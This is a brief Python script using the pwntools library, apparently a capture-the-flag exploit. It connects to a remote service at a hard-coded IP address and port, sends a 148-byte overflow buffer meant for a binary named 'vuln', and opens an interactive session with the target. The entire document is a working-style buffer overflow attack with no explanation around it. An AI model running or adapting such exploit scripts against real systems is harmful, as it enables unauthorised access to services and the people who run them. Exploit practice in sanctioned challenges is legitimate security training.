from pwn import *
r = remote("20.42.99.115",3000)
elf = ELF("./vuln")

buffer = b'A' * 148

r.sendline(buffer)

r.interactive()